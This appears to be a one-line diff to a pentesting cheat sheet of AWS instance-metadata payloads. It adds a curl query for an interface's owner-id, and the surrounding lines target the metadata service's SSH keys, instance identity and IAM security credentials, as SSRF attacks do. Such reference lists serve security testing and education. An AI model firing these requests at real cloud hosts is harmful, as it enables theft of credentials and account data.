@@ -107,6 +107,7 @@ AWS
 
 ```
 curl http://169.254.169.254/latest/meta-data/
+curl http://169.254.169.254/latest/meta-data/network/interfaces/macs/MAC!/owner-id/
 curl http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
 curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
 curl http://169.254.169.254/latest/dynamic/instance-identity/document/
